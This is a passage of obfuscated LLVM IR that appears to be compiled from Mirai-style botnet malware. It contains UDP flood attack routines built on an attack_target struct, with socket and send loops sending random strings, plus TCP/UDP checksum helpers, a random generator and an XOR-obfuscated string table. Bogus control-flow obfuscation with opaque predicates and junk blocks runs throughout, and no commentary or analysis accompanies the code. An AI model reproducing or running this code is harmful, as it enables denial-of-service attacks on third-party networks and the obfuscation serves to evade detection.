  %450 = trunc i32 %449 to i16
  store i16 %450, i16* %15, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %82
  %451 = load i32, i32* %11, align 4
  %452 = load i8, i8* %7, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp slt i32 %451, %453
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %130
  %455 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %456 = load i32*, i32** %13, align 8
  %457 = load i32, i32* %11, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds i32, i32* %456, i64 %458
  store i32 %455, i32* %459, align 4
  %460 = icmp eq i32 %455, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %153
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %188
  %461 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %462 = load i32, i32* %11, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 2
  %466 = load i8, i8* %465, align 4
  %467 = zext i8 %466 to i32
  %468 = icmp slt i32 %467, 32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %256
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %277
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %295
  %469 = load i32, i32* %11, align 4
  %470 = load i8, i8* %7, align 1
  %471 = zext i8 %470 to i32
  %472 = icmp slt i32 %469, %471
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %316
  %473 = load i8**, i8*** %12, align 8
  %474 = load i32, i32* %11, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds i8*, i8** %473, i64 %475
  %477 = load i8*, i8** %476, align 8
  store i8* %477, i8** %25, align 8
  %478 = load i8, i8* %17, align 1
  %479 = icmp ne i8 %478, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %340
  %480 = load i8*, i8** %25, align 8
  %481 = load i16, i16* %16, align 2
  %482 = zext i16 %481 to i32
  call void @rand_alpha_str(i8* %480, i32 %482)
  %483 = load i8*, i8** %25, align 8
  %484 = load i16, i16* %16, align 2
  %485 = zext i16 %484 to i64
  %486 = getelementptr inbounds i8, i8* %483, i64 %485
  store i8 0, i8* %486, align 1
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %364
  %487 = load i32*, i32** %13, align 8
  %488 = load i32, i32* %11, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds i32, i32* %487, i64 %489
  %491 = load i32, i32* %490, align 4
  %492 = load i8*, i8** %25, align 8
  %493 = load i16, i16* %16, align 2
  %494 = zext i16 %493 to i64
  %495 = call i64 @send(i32 %491, i8* %492, i64 %494, i32 16384)
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %393
  %496 = call i64 @time(i64* null) #6
  %497 = load i32, i32* %19, align 4
  %498 = sext i32 %497 to i64
  %499 = icmp sgt i64 %496, %498
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %415
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %432
  br label %originalBB50
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %48, %2
  %7 = load i32, i32* @x.37
  %8 = load i32, i32* @y.38
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %4, align 4
  %16 = icmp ugt i32 %15, 1
  %17 = load i32, i32* @x.37
  %18 = load i32, i32* @y.38
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %51

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i32, i32* @x.37
  %27 = load i32, i32* @y.38
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i16*, i16** %3, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %3, align 8
  %36 = load i16, i16* %34, align 2
  %37 = zext i16 %36 to i64
  %38 = load i64, i64* %5, align 8
  %39 = add i64 %38, %37
  store i64 %39, i64* %5, align 8
  %40 = load i32, i32* @x.37
  %41 = load i32, i32* @y.38
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br label %48

; <label>:48:                                     ; preds = %originalBBpart25
  %49 = load i32, i32* %4, align 4
  %50 = sub i32 %49, 2
  store i32 %50, i32* %4, align 4
  br label %6

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* %4, align 4
  %53 = icmp eq i32 %52, 1
  br i1 %53, label %54, label %77

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.37
  %56 = load i32, i32* @y.38
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %54
  %63 = load i16*, i16** %3, align 8
  %64 = load i16, i16* %63, align 2
  %65 = trunc i16 %64 to i8
  %66 = sext i8 %65 to i64
  %67 = load i64, i64* %5, align 8
  %68 = add i64 %67, %66
  store i64 %68, i64* %5, align 8
  %69 = load i32, i32* @x.37
  %70 = load i32, i32* @y.38
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart216, label %originalBB7alteredBB

originalBBpart216:                                ; preds = %originalBB7
  br label %77

; <label>:77:                                     ; preds = %originalBBpart216, %51
  %78 = load i64, i64* %5, align 8
  %79 = lshr i64 %78, 16
  %80 = load i64, i64* %5, align 8
  %81 = and i64 %80, 65535
  %82 = add i64 %79, %81
  store i64 %82, i64* %5, align 8
  %83 = load i64, i64* %5, align 8
  %84 = lshr i64 %83, 16
  %85 = load i64, i64* %5, align 8
  %86 = add i64 %85, %84
  store i64 %86, i64* %5, align 8
  %87 = load i64, i64* %5, align 8
  %88 = xor i64 %87, -1
  %89 = trunc i64 %88 to i16
  ret i16 %89

originalBBalteredBB:                              ; preds = %originalBB, %6
  %90 = load i32, i32* %4, align 4
  %91 = icmp ugt i32 %90, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %92 = load i16*, i16** %3, align 8
  %93 = getelementptr inbounds i16, i16* %92, i32 1
  store i16* %93, i16** %3, align 8
  %94 = load i16, i16* %92, align 2
  %95 = zext i16 %94 to i64
  %96 = load i64, i64* %5, align 8
  %_ = sub i64 %96, %95
  %gen = mul i64 %_, %95
  %_2 = sub i64 0, %96
  %gen3 = add i64 %_2, %95
  %97 = add i64 %96, %95
  store i64 %97, i64* %5, align 8
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %54
  %98 = load i16*, i16** %3, align 8
  %99 = load i16, i16* %98, align 2
  %100 = trunc i16 %99 to i8
  %101 = sext i8 %100 to i64
  %102 = load i64, i64* %5, align 8
  %_8 = sub i64 0, %102
  %gen9 = add i64 %_8, %101
  %_10 = sub i64 0, %102
  %gen11 = add i64 %_10, %101
  %_12 = sub i64 %102, %101
  %gen13 = mul i64 %_12, %101
  %_14 = shl i64 %102, %101
  %103 = add i64 %102, %101
  store i64 %103, i64* %5, align 8
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %62

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* @x.39
  %41 = load i32, i32* @y.40
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i16*, i16** %9, align 8
  %49 = bitcast i16* %48 to i8*
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* @x.39
  %55 = load i32, i32* @y.40
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %36
  %63 = load i32, i32* @x.39
  %64 = load i32, i32* @y.40
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %62
  %71 = load i32, i32* %10, align 4
  %72 = lshr i32 %71, 16
  %73 = and i32 %72, 65535
  %74 = load i32, i32* %12, align 4
  %75 = add i32 %74, %73
  store i32 %75, i32* %12, align 4
  %76 = load i32, i32* %10, align 4
  %77 = and i32 %76, 65535
  %78 = load i32, i32* %12, align 4
  %79 = add i32 %78, %77
  store i32 %79, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = and i32 %81, 65535
  %83 = load i32, i32* %12, align 4
  %84 = add i32 %83, %82
  store i32 %84, i32* %12, align 4
  %85 = load i32, i32* %11, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = add i32 %87, %86
  store i32 %88, i32* %12, align 4
  %89 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 6
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i16
  %93 = call zeroext i16 @htons(i16 zeroext %92) #7
  %94 = zext i16 %93 to i32
  %95 = load i32, i32* %12, align 4
  %96 = add i32 %95, %94
  store i32 %96, i32* %12, align 4
  %97 = load i16, i16* %7, align 2
  %98 = zext i16 %97 to i32
  %99 = load i32, i32* %12, align 4
  %100 = add i32 %99, %98
  store i32 %100, i32* %12, align 4
  %101 = load i32, i32* @x.39
  %102 = load i32, i32* @y.40
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart2109, label %originalBB7alteredBB

originalBBpart2109:                               ; preds = %originalBB7
  br label %109

; <label>:109:                                    ; preds = %originalBBpart2142, %originalBBpart2109
  %110 = load i32, i32* @x.39
  %111 = load i32, i32* @y.40
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %109
  %118 = load i32, i32* %12, align 4
  %119 = lshr i32 %118, 16
  %120 = icmp ne i32 %119, 0
  %121 = load i32, i32* @x.39
  %122 = load i32, i32* @y.40
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart2126, label %originalBB111alteredBB

originalBBpart2126:                               ; preds = %originalBB111
  br i1 %120, label %129, label %151

; <label>:129:                                    ; preds = %originalBBpart2126
  %130 = load i32, i32* @x.39
  %131 = load i32, i32* @y.40
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %129
  %138 = load i32, i32* %12, align 4
  %139 = and i32 %138, 65535
  %140 = load i32, i32* %12, align 4
  %141 = lshr i32 %140, 16
  %142 = add i32 %139, %141
  store i32 %142, i32* %12, align 4
  %143 = load i32, i32* @x.39
  %144 = load i32, i32* @y.40
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart2142, label %originalBB128alteredBB

originalBBpart2142:                               ; preds = %originalBB128
  br label %109

; <label>:151:                                    ; preds = %originalBBpart2126
  %152 = load i32, i32* %12, align 4
  %153 = xor i32 %152, -1
  %154 = trunc i32 %153 to i16
  ret i16 %154

originalBBalteredBB:                              ; preds = %originalBB, %39
  %155 = load i16*, i16** %9, align 8
  %156 = bitcast i16* %155 to i8*
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = load i32, i32* %12, align 4
  %_ = sub i32 %159, %158
  %gen = mul i32 %_, %158
  %_1 = sub i32 %159, %158
  %gen2 = mul i32 %_1, %158
  %_3 = sub i32 %159, %158
  %gen4 = mul i32 %_3, %158
  %_5 = sub i32 0, %159
  %gen6 = add i32 %_5, %158
  %160 = add i32 %159, %158
  store i32 %160, i32* %12, align 4
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %62
  %161 = load i32, i32* %10, align 4
  %_8 = sub i32 0, %161
  %gen9 = add i32 %_8, 16
  %_10 = sub i32 %161, 16
  %gen11 = mul i32 %_10, 16
  %_12 = sub i32 0, %161
  %gen13 = add i32 %_12, 16
  %_14 = sub i32 0, %161
  %gen15 = add i32 %_14, 16
  %_16 = shl i32 %161, 16
  %_17 = shl i32 %161, 16
  %162 = lshr i32 %161, 16
  %_18 = sub i32 0, %162
  %gen19 = add i32 %_18, 65535
  %_20 = sub i32 0, %162
  %gen21 = add i32 %_20, 65535
  %_22 = sub i32 0, %162
  %gen23 = add i32 %_22, 65535
  %_24 = shl i32 %162, 65535
  %_25 = sub i32 0, %162
  %gen26 = add i32 %_25, 65535
  %_27 = shl i32 %162, 65535
  %_28 = sub i32 0, %162
  %gen29 = add i32 %_28, 65535
  %_30 = shl i32 %162, 65535
  %163 = and i32 %162, 65535
  %164 = load i32, i32* %12, align 4
  %_31 = sub i32 0, %164
  %gen32 = add i32 %_31, %163
  %_33 = sub i32 %164, %163
  %gen34 = mul i32 %_33, %163
  %_35 = sub i32 0, %164
  %gen36 = add i32 %_35, %163
  %_37 = sub i32 0, %164
  %gen38 = add i32 %_37, %163
  %165 = add i32 %164, %163
  store i32 %165, i32* %12, align 4
  %166 = load i32, i32* %10, align 4
  %_39 = shl i32 %166, 65535
  %_40 = sub i32 0, %166
  %gen41 = add i32 %_40, 65535
  %_42 = sub i32 0, %166
  %gen43 = add i32 %_42, 65535
  %_44 = sub i32 0, %166
  %gen45 = add i32 %_44, 65535
  %_46 = sub i32 0, %166
  %gen47 = add i32 %_46, 65535
  %_48 = sub i32 0, %166
  %gen49 = add i32 %_48, 65535
  %_50 = sub i32 %166, 65535
  %gen51 = mul i32 %_50, 65535
  %_52 = shl i32 %166, 65535
  %_53 = sub i32 0, %166
  %gen54 = add i32 %_53, 65535
  %167 = and i32 %166, 65535
  %168 = load i32, i32* %12, align 4
  %_55 = shl i32 %168, %167
  %_56 = shl i32 %168, %167
  %_57 = sub i32 0, %168
  %gen58 = add i32 %_57, %167
  %169 = add i32 %168, %167
  store i32 %169, i32* %12, align 4
  %170 = load i32, i32* %11, align 4
  %_59 = sub i32 %170, 16
  %gen60 = mul i32 %_59, 16
  %171 = lshr i32 %170, 16
  %_61 = sub i32 0, %171
  %gen62 = add i32 %_61, 65535
  %_63 = sub i32 %171, 65535
  %gen64 = mul i32 %_63, 65535
  %_65 = sub i32 0, %171
  %gen66 = add i32 %_65, 65535
  %172 = and i32 %171, 65535
  %173 = load i32, i32* %12, align 4
  %_67 = shl i32 %173, %172
  %_68 = sub i32 0, %173
  %gen69 = add i32 %_68, %172
  %_70 = sub i32 0, %173
  %gen71 = add i32 %_70, %172
  %_72 = shl i32 %173, %172
  %_73 = sub i32 0, %173
  %gen74 = add i32 %_73, %172
  %174 = add i32 %173, %172
  store i32 %174, i32* %12, align 4
  %175 = load i32, i32* %11, align 4
  %_75 = sub i32 %175, 65535
  %gen76 = mul i32 %_75, 65535
  %_77 = sub i32 0, %175
  %gen78 = add i32 %_77, 65535
  %_79 = sub i32 0, %175
  %gen80 = add i32 %_79, 65535
  %_81 = shl i32 %175, 65535
  %_82 = sub i32 %175, 65535
  %gen83 = mul i32 %_82, 65535
  %176 = and i32 %175, 65535
  %177 = load i32, i32* %12, align 4
  %_84 = sub i32 0, %177
  %gen85 = add i32 %_84, %176
  %_86 = shl i32 %177, %176
  %178 = add i32 %177, %176
  store i32 %178, i32* %12, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i16
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = zext i16 %183 to i32
  %185 = load i32, i32* %12, align 4
  %_87 = sub i32 %185, %184
  %gen88 = mul i32 %_87, %184
  %_89 = sub i32 %185, %184
  %gen90 = mul i32 %_89, %184
  %_91 = sub i32 0, %185
  %gen92 = add i32 %_91, %184
  %_93 = shl i32 %185, %184
  %186 = add i32 %185, %184
  store i32 %186, i32* %12, align 4
  %187 = load i16, i16* %7, align 2
  %188 = zext i16 %187 to i32
  %189 = load i32, i32* %12, align 4
  %_94 = sub i32 %189, %188
  %gen95 = mul i32 %_94, %188
  %_96 = sub i32 %189, %188
  %gen97 = mul i32 %_96, %188
  %_98 = sub i32 %189, %188
  %gen99 = mul i32 %_98, %188
  %_100 = sub i32 0, %189
  %gen101 = add i32 %_100, %188
  %_102 = sub i32 0, %189
  %gen103 = add i32 %_102, %188
  %_104 = sub i32 %189, %188
  %gen105 = mul i32 %_104, %188
  %_106 = sub i32 0, %189
  %gen107 = add i32 %_106, %188
  %190 = add i32 %189, %188
  store i32 %190, i32* %12, align 4
  br label %originalBB7

originalBB111alteredBB:                           ; preds = %originalBB111, %109
  %191 = load i32, i32* %12, align 4
  %_112 = shl i32 %191, 16
  %_113 = sub i32 %191, 16
  %gen114 = mul i32 %_113, 16
  %_115 = sub i32 %191, 16
  %gen116 = mul i32 %_115, 16
  %_117 = sub i32 0, %191
  %gen118 = add i32 %_117, 16
  %_119 = sub i32 0, %191
  %gen120 = add i32 %_119, 16
  %_121 = sub i32 %191, 16
  %gen122 = mul i32 %_121, 16
  %_123 = sub i32 0, %191
  %gen124 = add i32 %_123, 16
  %192 = lshr i32 %191, 16
  %193 = icmp ne i32 %192, 0
  br label %originalBB111

originalBB128alteredBB:                           ; preds = %originalBB128, %129
  %194 = load i32, i32* %12, align 4
  %_129 = sub i32 0, %194
  %gen130 = add i32 %_129, 65535
  %_131 = sub i32 0, %194
  %gen132 = add i32 %_131, 65535
  %195 = and i32 %194, 65535
  %196 = load i32, i32* %12, align 4
  %_133 = sub i32 %196, 16
  %gen134 = mul i32 %_133, 16
  %197 = lshr i32 %196, 16
  %_135 = shl i32 %195, %197
  %_136 = sub i32 %195, %197
  %gen137 = mul i32 %_136, %197
  %_138 = sub i32 %195, %197
  %gen139 = mul i32 %_138, %197
  %_140 = shl i32 %195, %197
  %198 = add i32 %195, %197
  store i32 %198, i32* %12, align 4
  br label %originalBB128
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [23 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 41)
  %6 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 41, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

; <label>:13:                                     ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i32 0, i32 0
  %16 = call i32 @util_strlen(i8* %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [23 x i8], [23 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9

; <label>:23:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 41)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %99, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %102

; <label>:34:                                     ; preds = %27
  %35 = load i32, i32* @x.47
  %36 = load i32, i32* @y.48
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i8, i8* %5, align 1
  %44 = zext i8 %43 to i32
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 0
  %47 = load i8*, i8** %46, align 8
  %48 = load i32, i32* %3, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = xor i32 %52, %44
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %50, align 1
  %55 = load i8, i8* %6, align 1
  %56 = zext i8 %55 to i32
  %57 = load %struct.table_value*, %struct.table_value** %4, align 8
  %58 = getelementptr inbounds %struct.table_value, %struct.table_value* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = xor i32 %64, %56
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %62, align 1
  %67 = load i8, i8* %7, align 1
